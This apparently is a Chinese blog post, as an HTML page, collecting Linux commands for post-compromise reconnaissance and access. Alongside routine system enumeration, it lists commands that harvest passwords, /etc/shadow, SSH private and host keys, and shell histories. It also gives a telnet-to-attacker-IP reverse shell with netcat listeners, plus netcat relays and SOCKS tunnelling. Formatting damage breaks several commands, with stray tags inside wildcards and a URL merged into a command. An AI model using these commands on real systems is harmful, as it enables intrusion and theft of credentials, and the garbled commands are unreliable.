@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+<head>
+
+        <title>Linux 系统命令收集</title>
+        <meta charset="utf-8" />
+
+
+        <!-- Mobile viewport optimized: j.mp/bplateviewport -->
+        <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1">
+
+        <link rel="stylesheet" type="text/css" href="/blog/theme/gumby.css" />
+        <link rel="stylesheet" type="text/css" href="/blog/theme/style.css" />
+        <link rel="stylesheet" type="text/css" href="/blog/theme/pygment.css" />
+
+        <script src="/blog/theme/js/libs/modernizr-2.6.2.min.js"></script>
+
+
+
+
+</head>
+
+<body id="index" class="home">
+
+
+    <div class="container">
+
+        <div class="row">
+
+          <header id="banner" class="body">
+                  <h1><a href="/blog/">逍遥の博客 <strong></strong></a></h1>
+          </header><!-- /#banner -->
+
+            <div id="navigation" class="navbar row">
+              <a href="#" gumby-trigger="#navigation &gt; ul" class="toggle"><i class="icon-menu"></i></a>
+             
+              <ul class="columns">
+                <li><a href="/blog/">首页</a></li>
+
+
+              </ul>
+
+            </div>
+
+<section id="content" class="body">
+
+   <div class="row">
+        <div class="eleven columns">
+
+
+            <header>
+              <h2 class="entry-title">
+                <a href="/blog/26.html" rel="bookmark"
+                   title="Permalink to Linux 系统命令收集">Linux 系统命令收集</a></h2>
+           
+            </header>
+            <footer class="post-info">
+              <abbr class="published" title="2017-02-20T08:30:00+08:00">
+                周一 20 二月 2017
+              </abbr>
+              <address class="vcard author">By 
+                <a class="url fn" href="/blog/author/u0mo5.html"> u0mo5</a>
+              </address>
+            </footer><!-- /.post-info -->
+            <div class="entry-content">
+              <h2>###<span class="mw-headline" id=".E5.B8.B8.E7.94.A8.E5.91.BD.E4.BB.A4" style="word-wrap: break-word;">常用命令</span><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E7.B3.BB.E7.BB.9F.E7.89.88.E6.9C.AC" style="word-wrap: break-word;">查看系统版本</span></h4>cat&nbsp;/etc/issue</h2>
+<p>cat&nbsp;/etc/<em>-release
+cat&nbsp;/etc/lsb-release
+cat&nbsp;/etc/redhat-release</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E5.86.85.E6.A0.B8.E7.89.88.E6.9C.AC" style="word-wrap: break-word;">查看内核版本</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;/proc/version
+uname&nbsp;-a
+uname&nbsp;-mrs
+rpm&nbsp;-q&nbsp;kernel
+dmesg&nbsp;|&nbsp;grep&nbsp;Linux
+ls&nbsp;/boot&nbsp;|&nbsp;grep&nbsp;vmlinuz</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E7.8E.AF.E5.A2.83.E5.8F.98.E9.87.8F.E9.87.8C" style="word-wrap: break-word;">查看环境变量里</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;/etc/profile
+cat&nbsp;/etc/bashrc
+cat&nbsp;~/.bash_profile
+cat&nbsp;~/.bashrc
+cat&nbsp;~/.bash_logout
+env
+set</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E6.98.AF.E5.90.A6.E5.AD.98.E5.9C.A8.E6.89.93.E5.8D.B0.E6.9C.BA" style="word-wrap: break-word;">查看是否存在打印机</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">lpstat&nbsp;-a</pre><p style="word-wrap: break-word; margin-top: 0.5em; margin-bottom: 0.5em; padding: 0px; font-size: 14px; white-space: normal; line-height: inherit; color: rgb(37, 37, 37); background-color: rgb(255, 255, 255);"><br style="word-wrap: break-word;"/>###<span class="mw-headline" id=".E5.BA.94.E7.94.A8.E4.B8.8E.E6.9C.8D.E5.8A.A1" style="word-wrap: break-word;">应用与服务</span><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E6.AD.A3.E5.9C.A8.E8.BF.90.E8.A1.8C.E7.9A.84.E6.9C.8D.E5.8A.A1.E4.BB.A5.E5.8F.8A.E6.9D.83.E9.99.90" style="word-wrap: break-word;">查看正在运行的服务以及权限</span></h4>ps&nbsp;aux
+ps&nbsp;-ef
+top
+cat&nbsp;/etc/service</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E5.85.B7.E6.9C.89_root_.E6.9D.83.E9.99.90.E7.9A.84.E8.BF.9B.E7.A8.8B" style="word-wrap: break-word;">查看具有 root 权限的进程</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">ps&nbsp;aux&nbsp;|&nbsp;grep&nbsp;root
+ps&nbsp;-ef&nbsp;|&nbsp;grep&nbsp;root</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E5.B7.B2.E5.AE.89.E8.A3.85.E7.A8.8B.E5.BA.8F.E3.80.81.E7.89.88.E6.9C.AC.E5.8F.8A.E8.BF.90.E8.A1.8C.E7.8A.B6.E6.80.81" style="word-wrap: break-word;">查看已安装程序、版本及运行状态</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">ls&nbsp;-alh&nbsp;/usr/bin/
+ls&nbsp;-alh&nbsp;/sbin/
+dpkg&nbsp;-l
+rpm&nbsp;-qa
+ls&nbsp;-alh&nbsp;/var/cache/apt/archivesO
+ls&nbsp;-alh&nbsp;/var/cache/yum/</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8BService_.E8.AE.BE.E7.BD.AE" style="word-wrap: break-word;">查看Service 设置</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;/etc/syslog.conf
+cat&nbsp;/etc/chttp.conf
+cat&nbsp;/etc/lighttpd.conf
+cat&nbsp;/etc/cups/cupsd.conf
+cat&nbsp;/etc/inetd.conf
+cat&nbsp;/etc/apache2/apache2.conf
+cat&nbsp;/etc/my.conf
+cat&nbsp;/etc/httpd/conf/httpd.conf
+cat&nbsp;/opt/lampp/etc/httpd.conf
+ls&nbsp;-aRl&nbsp;/etc/&nbsp;|&nbsp;awk&nbsp;‘$1&nbsp;~&nbsp;/^.</em>r.<em>/</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E6.9C.AC.E6.9C.BA.E4.BB.BB.E5.8A.A1.E8.AE.A1.E5.88.92" style="word-wrap: break-word;">查看本机任务计划</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">crontab&nbsp;-l
+ls&nbsp;-alh&nbsp;/var/spool/cron
+ls&nbsp;-al&nbsp;/etc/&nbsp;|&nbsp;grep&nbsp;cron
+ls&nbsp;-al&nbsp;/etc/cron</em>
+cat&nbsp;/etc/cron<em>
+cat&nbsp;/etc/at.allow
+cat&nbsp;/etc/at.deny
+cat&nbsp;/etc/cron.allow
+cat&nbsp;/etc/cron.deny
+cat&nbsp;/etc/crontab
+cat&nbsp;/etc/anacrontab
+cat&nbsp;/var/spool/cron/crontabs/root</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE.E5.8F.AF.E8.83.BD.E5.AD.98.E6.9C.89.E7.94.A8.E6.88.B7.E5.90.8D.E5.92.8C.E5.AF.86.E7.A0.81.E7.9A.84.E6.96.87.E6.9C.AC" style="word-wrap: break-word;">查找可能存有用户名和密码的文本</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">grep&nbsp;-i&nbsp;user&nbsp;[filename]
+grep&nbsp;-i&nbsp;pass&nbsp;[filename]
+grep&nbsp;-C&nbsp;5&nbsp;“password”&nbsp;[filename]
+find&nbsp;.&nbsp;-name&nbsp;“</em>.php”&nbsp;-print0&nbsp;|&nbsp;xargs&nbsp;-0&nbsp;grep&nbsp;-i&nbsp;-n&nbsp;“var&nbsp;$password”&nbsp;#&nbsp;Joomla</pre>###<span class="mw-headline" id=".E9.80.9A.E4.BF.A1.E4.B8.8E.E7.BD.91.E7.BB.9C" style="word-wrap: break-word;">通信与网络</span><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B_NIC_.E4.BB.A5.E5.8F.8A.E8.BF.9E.E6.8E.A5.E4.BF.A1.E6.81.AF" style="word-wrap: break-word;">查看 NIC 以及连接信息</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">/sbin/ifconfig&nbsp;-a
+cat&nbsp;/etc/network/interfaces
+cat&nbsp;/etc/sysconfig/network</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E7.BD.91.E7.BB.9C.E9.85.8D.E7.BD.AE" style="word-wrap: break-word;">查看网络配置</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;/etc/resolv.conf
+cat&nbsp;/etc/sysconfig/network
+cat&nbsp;/etc/networks
+iptables&nbsp;-L
+hostname
+dnsdomainname</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E6.9C.AC.E6.9C.BA.E7.9A.84.E7.BD.91.E7.BB.9C.E8.BF.9E.E6.8E.A5.E4.BF.A1.E6.81.AF" style="word-wrap: break-word;">查看本机的网络连接信息</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">lsof&nbsp;-i
+lsof&nbsp;-i&nbsp;:80
+grep&nbsp;80&nbsp;/etc/services
+netstat&nbsp;-antup
+netstat&nbsp;-antpx
+netstat&nbsp;-tulpn
+chkconfig&nbsp;–list
+chkconfig&nbsp;–list&nbsp;|&nbsp;grep&nbsp;3:on
+last</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B_ARP_.E5.8F.8A.E8.B7.AF.E7.94.B1.E8.A1.A8.E4.BF.A1.E6.81.AF" style="word-wrap: break-word;">查看 ARP 及路由表信息</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">arp&nbsp;-e
+route
+/sbin/route&nbsp;-nee</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E5.97.85.E6.8E.A2.E6.95.B0.E6.8D.AE.E5.8C.85" style="word-wrap: break-word;">嗅探数据包</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">#&nbsp;tcpdump&nbsp;tcp&nbsp;dst&nbsp;[ip]&nbsp;[port]&nbsp;and&nbsp;tcp&nbsp;dst&nbsp;[ip]&nbsp;[port]
+tcpdump&nbsp;tcp&nbsp;dst&nbsp;192.168.1.7&nbsp;80&nbsp;and&nbsp;tcp&nbsp;dst&nbsp;10.2.2.222&nbsp;21</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E8.8E.B7.E5.BE.97.E4.B8.80.E4.B8.AA_Shell_.E4.B8.8E.E7.B3.BB.E7.BB.9F.E8.BF.9B.E8.A1.8C.E4.BA.A4.E4.BA.92" style="word-wrap: break-word;">获得一个 Shell 与系统进行交互</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">#&nbsp;http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/nc&nbsp;-lvp&nbsp;4444&nbsp;#&nbsp;Attacker.&nbsp;输入（命令）
+nc&nbsp;-lvp&nbsp;4445&nbsp;#&nbsp;Attacker.&nbsp;输出（结果）
+telnet&nbsp;[atackers&nbsp;ip]&nbsp;44444&nbsp;|&nbsp;/bin/sh&nbsp;|&nbsp;[local&nbsp;ip]&nbsp;44445&nbsp;#&nbsp;在目标系统上.&nbsp;使用攻击者的&nbsp;IP!</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E7.AB.AF.E5.8F.A3.E8.BD.AC.E5.8F.91.EF.BC.88.E7.AB.AF.E5.8F.A3.E9.87.8D.E5.AE.9A.E5.90.91.EF.BC.89" style="word-wrap: break-word;">端口转发（端口重定向）</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">#&nbsp;rinetd</p>
+<h1>&nbsp;http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch#&nbsp;fpipe</h1>
+<h1>&nbsp;FPipe.exe&nbsp;-l&nbsp;[local&nbsp;port]&nbsp;-r&nbsp;[remote&nbsp;port]&nbsp;-s&nbsp;[local&nbsp;port]&nbsp;[local&nbsp;IP]</h1>
+<p>FPipe.exe&nbsp;-l&nbsp;80&nbsp;-r&nbsp;80&nbsp;-s&nbsp;80&nbsp;192.168.1.7</p>
+<h1>ssh</h1>
+<h1>&nbsp;ssh&nbsp;-[L/R]&nbsp;[local&nbsp;port]:[remote&nbsp;ip]:[remote&nbsp;port]&nbsp;[local&nbsp;user]@[local&nbsp;ip]</h1>
+<p>ssh&nbsp;-L&nbsp;8080:127.0.0.1:80&nbsp;root@192.168.1.7&nbsp;#&nbsp;Local&nbsp;Port
+ssh&nbsp;-R&nbsp;8080:127.0.0.1:80&nbsp;root@192.168.1.7&nbsp;#&nbsp;Remote&nbsp;Port</p>
+<h1>mknod</h1>
+<h1>&nbsp;mknod&nbsp;backpipe&nbsp;p&nbsp;;&nbsp;nc&nbsp;-l&nbsp;-p&nbsp;[remote&nbsp;port]&nbsp;&lt;&nbsp;backpipe&nbsp;|&nbsp;nc&nbsp;[local&nbsp;IP]&nbsp;[local&nbsp;port]&nbsp;&gt;backpipe</h1>
+<p>mknod&nbsp;backpipe&nbsp;p&nbsp;;&nbsp;nc&nbsp;-l&nbsp;-p&nbsp;8080&nbsp;&lt;&nbsp;backpipe&nbsp;|&nbsp;nc&nbsp;10.1.1.251&nbsp;80&nbsp;&gt;backpipe&nbsp;#&nbsp;Port&nbsp;Relay
+mknod&nbsp;backpipe&nbsp;p&nbsp;;&nbsp;nc&nbsp;-l&nbsp;-p&nbsp;8080&nbsp;0&nbsp;&amp;&nbsp;&lt;&nbsp;backpipe&nbsp;|&nbsp;tee&nbsp;-a&nbsp;inflow&nbsp;|&nbsp;nc&nbsp;localhost&nbsp;80&nbsp;|&nbsp;tee&nbsp;-a&nbsp;outflow&nbsp;1&gt;backpipe&nbsp;#&nbsp;Proxy&nbsp;(Port&nbsp;80&nbsp;to&nbsp;8080)
+mknod
+backpipe&nbsp;p&nbsp;;&nbsp;nc&nbsp;-l&nbsp;-p&nbsp;8080&nbsp;0&nbsp;&amp;&nbsp;&lt;&nbsp;backpipe&nbsp;|&nbsp;tee&nbsp;-a&nbsp;inflow&nbsp;|&nbsp;nc
+localhost&nbsp;80&nbsp;|&nbsp;tee&nbsp;-a&nbsp;outflow&nbsp;&amp;&nbsp;1&gt;backpipe&nbsp;#&nbsp;Proxy&nbsp;monitor&nbsp;(Port&nbsp;80&nbsp;to&nbsp;8080)</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E5.BB.BA.E7.AB.8B.E8.BF.9C.E7.A8.8B_SSH_.E9.9A.A7.E9.81.93" style="word-wrap: break-word;">建立远程 SSH 隧道</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">ssh&nbsp;-D&nbsp;127.0.0.1:9050&nbsp;-N&nbsp;[username]@[ip]
+proxychains&nbsp;ifconfig</pre>###<span class="mw-headline" id=".E7.A7.98.E5.AF.86.E4.BF.A1.E6.81.AF.E5.92.8C.E7.94.A8.E6.88.B7" style="word-wrap: break-word;">秘密信息和用户</span><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E5.B7.B2.E7.99.BB.E5.BD.95.EF.BC.88.E5.9C.A8.E7.BA.BF.EF.BC.89.E8.B4.A6.E6.88.B7.E4.BB.A5.E5.8F.8A.E6.9D.83.E9.99.90.E8.AE.BE.E7.BD.AE" style="word-wrap: break-word;">查看已登录（在线）账户以及权限设置</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">id
+who
+w
+last
+cat&nbsp;/etc/passwd&nbsp;|&nbsp;cut&nbsp;-d:&nbsp;#&nbsp;List&nbsp;of&nbsp;users
+grep&nbsp;-v&nbsp;-E&nbsp;“^#”&nbsp;/etc/passwd&nbsp;|&nbsp;awk&nbsp;-F:&nbsp;&#39;$3&nbsp;==&nbsp;0&nbsp;{&nbsp;print&nbsp;$1}’&nbsp;#&nbsp;List&nbsp;of&nbsp;super&nbsp;users
+awk&nbsp;-F:&nbsp;‘($3&nbsp;==&nbsp;“0”)&nbsp;{print}&#39;&nbsp;/etc/passwd&nbsp;#&nbsp;List&nbsp;of&nbsp;super&nbsp;users
+cat&nbsp;/etc/sudoers
+sudo&nbsp;-l</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E6.95.8F.E6.84.9F.E6.96.87.E4.BB.B6" style="word-wrap: break-word;">查看敏感文件</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;/etc/passwd
+cat&nbsp;/etc/group
+cat&nbsp;/etc/shadow
+ls&nbsp;-alh&nbsp;/var/mail/</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E7.9B.B8.E5.85.B3.E7.9B.AE.E5.BD.95.E7.9A.84.E9.9A.90.E8.97.8F.E6.96.87.E4.BB.B6" style="word-wrap: break-word;">查看相关目录的隐藏文件</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">ls&nbsp;-ahlR&nbsp;/root/
+ls&nbsp;-ahlR&nbsp;/home/</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE.E5.AF.86.E7.A0.81.EF.BC.8C.E8.84.9A.E6.9C.AC.EF.BC.8C.E6.95.B0.E6.8D.AE.E5.BA.93.EF.BC.8C.E9.BB.98.E8.AE.A4.E9.85.8D.E7.BD.AE.E6.96.87.E4.BB.B6.E6.88.96.E6.97.A5.E5.BF.97.E6.96.87.E4.BB.B6" style="word-wrap: break-word;">查找密码，脚本，数据库，默认配置文件或日志文件</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;/var/apache2/config.inc
+cat&nbsp;/var/lib/mysql/mysql/user.MYD
+cat&nbsp;/root/anaconda-ks.cfg</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E6.93.8D.E4.BD.9C.E5.8E.86.E5.8F.B2.EF.BC.88SSH.EF.BC.8Cnano_.E7.AD.89.EF.BC.89" style="word-wrap: break-word;">查看操作历史（SSH，nano 等）</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;~/.bash_history
+cat&nbsp;~/.nano_history
+cat&nbsp;~/.atftp_history
+cat&nbsp;~/.mysql_history
+cat&nbsp;~/.php_history</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE.E7.94.A8.E6.88.B7.E4.BF.A1.E6.81.AF" style="word-wrap: break-word;">查找用户信息</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;~/.bashrc
+cat&nbsp;~/.profile
+cat&nbsp;/var/mail/root
+cat&nbsp;/var/spool/mail/root</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE.E4.B8.BB.E6.9C.BA.E4.B8.8A.E7.9A.84.E7.A7.81.E9.92.A5" style="word-wrap: break-word;">查找主机上的私钥</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;~/.ssh/authorized_keys
+cat&nbsp;~/.ssh/identity.pub
+cat&nbsp;~/.ssh/identity
+cat&nbsp;~/.ssh/id_rsa.pub
+cat&nbsp;~/.ssh/id_rsa
+cat&nbsp;~/.ssh/id_dsa.pub
+cat&nbsp;~/.ssh/id_dsa
+cat&nbsp;/etc/ssh/ssh_config
+cat&nbsp;/etc/ssh/sshd_config
+cat&nbsp;/etc/ssh/ssh_host_dsa_key.pub
+cat&nbsp;/etc/ssh/ssh_host_dsa_key
+cat&nbsp;/etc/ssh/ssh_host_rsa_key.pub
+cat&nbsp;/etc/ssh/ssh_host_rsa_key
+cat&nbsp;/etc/ssh/ssh_host_key.pub
+cat&nbsp;/etc/ssh/ssh_host_key</pre>###<span class="mw-headline" id=".E6.96.87.E4.BB.B6.E7.B3.BB.E7.BB.9F" style="word-wrap: break-word;">文件系统</span><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE.E5.85.B7.E5.A4.87_.2Fetc.2F_.E7.9B.AE.E5.BD.95.E5.86.99.E6.9D.83.E9.99.90.E7.9A.84.E7.94.A8.E6.88.B7.E4.BB.A5.E5.8F.8A.E9.87.8D.E6.96.B0.E9.85.8D.E7.BD.AE.E6.9C.8D.E5.8A.A1.E7.9A.84.E7.94.A8.E6.88.B7" style="word-wrap: break-word;">查找具备 /etc/ 目录写权限的用户以及重新配置服务的用户</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">ls&nbsp;-aRl&nbsp;/etc/&nbsp;|&nbsp;awk&nbsp;‘$1&nbsp;~&nbsp;/^.<em>w.</em>/’&nbsp;2&gt;/dev/null&nbsp;#&nbsp;Anyone
+ls&nbsp;-aRl&nbsp;/etc/&nbsp;|&nbsp;awk&nbsp;’$1&nbsp;~&nbsp;/^..w/’&nbsp;2&gt;/dev/null&nbsp;#&nbsp;Owner
+ls&nbsp;-aRl&nbsp;/etc/&nbsp;|&nbsp;awk&nbsp;‘$1&nbsp;~&nbsp;/^…..w/’&nbsp;2&gt;/dev/null&nbsp;#&nbsp;Group
